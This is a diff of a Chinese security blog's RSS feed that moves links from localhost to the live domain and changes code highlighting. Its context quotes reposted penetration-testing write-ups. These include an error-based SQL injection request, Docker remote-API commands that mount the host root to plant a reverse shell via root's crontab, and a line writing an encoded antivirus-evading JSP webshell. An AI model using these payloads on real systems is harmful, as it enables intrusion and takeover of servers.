@@ -1,15 +1,15 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
         <title>信息收集 - 标签 - bysec</title>
-        <link>http://localhost:1313/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
+        <link>https://www.bysec.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
         <description>信息收集 - 标签 - bysec</description>
         <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>bysec@qq.com (bysec)</managingEditor>
-            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Mon, 02 Sep 2024 18:34:17 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Mon, 02 Sep 2024 18:34:17 &#43;0800</lastBuildDate><atom:link href="https://www.bysec.cn/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="self" type="application/rss+xml" /><item>
     <title>一次经典教育系统后台漏洞打包</title>
-    <link>http://localhost:1313/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/</link>
+    <link>https://www.bysec.cn/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/</link>
     <pubDate>Mon, 02 Sep 2024 18:34:17 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/</guid>
+    </author><guid>https://www.bysec.cn/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/3693" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/3693</a></em></p>
 </blockquote>
@@ -241,10 +241,10 @@ aspx 语言首先想尝试一句话木马</p>
 <p>(所有增添账号和上传文件均删除)</p>]]></description>
 </item><item>
     <title>教育行业渗透打点</title>
-    <link>http://localhost:1313/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</link>
+    <link>https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</link>
     <pubDate>Sun, 28 Jul 2024 18:23:14 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</guid>
+    </author><guid>https://www.bysec.cn/%E6%95%99%E8%82%B2%E8%A1%8C%E4%B8%9A%E6%B8%97%E9%80%8F%E6%89%93%E7%82%B9/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2423" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2423</a></em></p>
 </blockquote>
@@ -333,7 +333,7 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;datas&#34;</span><span class="o">:</span><span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">sign</span><span class="se">\&#34;</span><span class="s2">:</span><span class="se">\&#34;</span><span class="s2">407ec6dc275f4766a4525e059a60ca16</span><span class="se">\&#34;</span><span class="s2">}&#34;</span><span class="p">,</span><span class="s2">&#34;code&#34;</span><span class="o">:</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;message&#34;</span><span class="o">:</span><span class="s2">&#34;获取成功&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;datas&#34;:&#34;{\&#34;sign\&#34;:\&#34;407ec6dc275f4766a4525e059a60ca16\&#34;}&#34;,&#34;code&#34;:&#34;0&#34;,&#34;message&#34;:&#34;获取成功&#34;
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>随意输入验证码，点击下一步，并把上面的流量包直接返回</p>
@@ -438,7 +438,7 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">system</span><span class="o">/</span><span class="nx">role</span><span class="o">/</span><span class="k">list</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="nx">Host</span><span class="o">:</span> <span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span> <span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mi">0</span> <span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span> <span class="mi">1</span> <span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">84.0</span><span class="o">.</span><span class="mf">4147.105</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span> <span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">signed</span><span class="o">-</span><span class="nx">exchange</span><span class="p">;</span><span class="nx">v</span><span class="o">=</span><span class="nx">b3</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span> <span class="nx">same</span><span class="o">-</span><span class="nx">origin</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span> <span class="nx">navigate</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span> <span class="o">?</span><span class="mi">1</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span> <span class="nx">document</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span> <span class="nx">Cookie</span><span class="o">:</span> <span class="nx">JSESSIONID</span><span class="o">=</span><span class="nx">e9f143b9</span><span class="o">-</span><span class="mi">3</span><span class="nx">c3d</span><span class="o">-</span><span class="mi">4</span><span class="nx">acb</span><span class="o">-</span><span class="mi">96</span><span class="nx">a4</span><span class="o">-</span><span class="mi">93</span><span class="nx">c7367a98e9</span> <span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">75</span> <span class="nx">params</span><span class="p">[</span><span class="nx">dataScope</span><span class="p">]</span><span class="o">=</span><span class="k">and</span> <span class="nx">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="nx">select</span> <span class="nx">database</span><span class="p">()),</span><span class="mh">0x7e</span><span class="p">))</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /system/role/list HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=e9f143b9-3c3d-4acb-96a4-93c7367a98e9 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 75 params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="6fckeditor上传文件getshell" class="headerLink">
@@ -537,10 +537,10 @@ aspx 语言首先想尝试一句话木马</p>
 <p>总结起来就是多信息收集，信息收集yyds</p>]]></description>
 </item><item>
     <title>万字总结信息收集全网最全</title>
-    <link>http://localhost:1313/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</link>
+    <link>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</link>
     <pubDate>Fri, 26 Apr 2024 18:19:39 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</guid>
+    </author><guid>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2841" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2841</a></em></p>
 </blockquote>
@@ -1506,10 +1506,10 @@ aspx 语言首先想尝试一句话木马</p>
 <p>·12社工、XSS利用社会工程系获取后台，利用存储型XSs获取后台</p>]]></description>
 </item><item>
     <title>攻防实战外网突破</title>
-    <link>http://localhost:1313/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</link>
+    <link>https://www.bysec.cn/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</link>
     <pubDate>Sun, 11 Feb 2024 18:24:29 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</guid>
+    </author><guid>https://www.bysec.cn/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2442" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2442</a></em></p>
 </blockquote>
@@ -1556,7 +1556,7 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">mobile</span><span class="o">/</span><span class="nx">Containers</span><span class="o">/</span><span class="nx">Data</span><span class="o">/</span><span class="nx">Application</span><span class="o">/</span><span class="p">{</span><span class="nx">系统UUID</span><span class="p">}</span><span class="o">/</span><span class="nx">Library</span><span class="o">/</span><span class="nx">WechatPrivate</span><span class="o">/</span><span class="p">{</span><span class="nx">user哈希值</span><span class="p">}</span><span class="o">/</span><span class="nx">WeApp</span><span class="o">/</span><span class="nx">LocalCache</span><span class="o">/</span><span class="nx">release</span><span class="o">/</span><span class="p">{</span><span class="nx">小程序的AppID</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mobile</span><span class="o">/</span><span class="n">Containers</span><span class="o">/</span><span class="n">Data</span><span class="o">/</span><span class="n">Application</span><span class="o">/</span><span class="p">{</span><span class="err">系统</span><span class="n">UUID</span><span class="p">}</span><span class="o">/</span><span class="n">Library</span><span class="o">/</span><span class="n">WechatPrivate</span><span class="o">/</span><span class="p">{</span><span class="n">user哈希值</span><span class="p">}</span><span class="o">/</span><span class="n">WeApp</span><span class="o">/</span><span class="n">LocalCache</span><span class="o">/</span><span class="n">release</span><span class="o">/</span><span class="p">{</span><span class="err">小程序的</span><span class="n">AppID</span><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Android wxapkg 文件存放路径为：</p>
@@ -1565,7 +1565,7 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">com</span><span class="o">.</span><span class="nx">tencent</span><span class="o">.</span><span class="nx">mm</span><span class="o">/</span><span class="nx">MicroMsg</span><span class="o">/</span><span class="p">{</span><span class="nx">user哈希值</span><span class="p">}</span><span class="o">/</span><span class="nx">appbrand</span><span class="o">/</span><span class="nx">pkg</span><span class="o">/</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/data/data/com.tencent.mm/MicroMsg/{user哈希值}/appbrand/pkg/
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Windows wxapkg 文件存放路径为：</p>
@@ -1574,7 +1574,7 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">C</span><span class="o">:</span><span class="nx">\Users\</span><span class="p">{</span><span class="nx">系统用户名</span><span class="p">}</span><span class="nx">\Documents\WeChat</span> <span class="nx">Files\Applet\</span><span class="p">{</span><span class="nx">小程序的AppID</span><span class="p">}</span><span class="nx">\</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\Users\{系统用户名}\Documents\WeChat Files\Applet\{小程序的AppID}\
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000lTGIx3lEYaF.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000lTGIx3lEYaF.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000lTGIx3lEYaF.jpg">
@@ -1600,7 +1600,7 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">node</span> <span class="nx">wuWxapkg</span><span class="o">.</span><span class="nx">js</span> <span class="mf">1.</span><span class="nx">wxapkg</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">node wuWxapkg.js 1.wxapkg
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000s8kYv2fYb69.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000s8kYv2fYb69.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000s8kYv2fYb69.jpg">
@@ -1676,8 +1676,8 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#查看容器 docker -H tcp://&lt;target&gt;:2375 ps -a
-</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#查看容器 docker -H tcp://&lt;target&gt;:2375 ps -a
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001MHqGf3HNr4k.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001MHqGf3HNr4k.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001MHqGf3HNr4k.jpg">
         
@@ -1687,8 +1687,8 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#挂载宿主机的根目录到容器内的mnt目录 docker -H tcp://&lt;target&gt;:2375 run -it -v /:/mnt nginx:latest /bin/bash #反弹shell echo &#39;反弹shell命令&#39; &gt;&gt; /mnt/var/spool/cron/crontabs/root
-</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#挂载宿主机的根目录到容器内的mnt目录 docker -H tcp://&lt;target&gt;:2375 run -it -v /:/mnt nginx:latest /bin/bash #反弹shell echo &#39;反弹shell命令&#39; &gt;&gt; /mnt/var/spool/cron/crontabs/root</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="24nacos" class="headerLink">
     <a href="#24nacos" class="header-mark"></a>2.4、Nacos</h2><p>Nacos是一个开源的动态服务发现、配置管理和服务管理平台，它提供了注册中心、配置中心和服务管理等功能，帮助开发人员实现微服务架构中的服务注册、配置管理以及服务发现等需求。</p>
@@ -1712,7 +1712,7 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">spring</span><span class="o">:</span> <span class="nx">datasource</span><span class="o">:</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">your</span><span class="o">-</span><span class="nx">username</span> <span class="nx">password</span><span class="o">:</span> <span class="nx">ENC</span><span class="p">(</span><span class="nx">encrypted</span><span class="o">-</span><span class="nx">password</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">spring: datasource: username: your-username password: ENC(encrypted-password)
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>因为必须要解密，密码就需要放在配置文件里，或者放在代码中：</p>
@@ -1765,7 +1765,7 @@ aspx 语言首先想尝试一句话木马</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">bash64编码后的免杀马</span> <span class="o">&gt;</span> <span class="nx">myfile</span><span class="o">.</span><span class="nx">jsp</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo bash64编码后的免杀马 &gt; myfile.jsp
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000004RWxGH2Yf0KH.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000004RWxGH2Yf0KH.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000004RWxGH2Yf0KH.jpg">
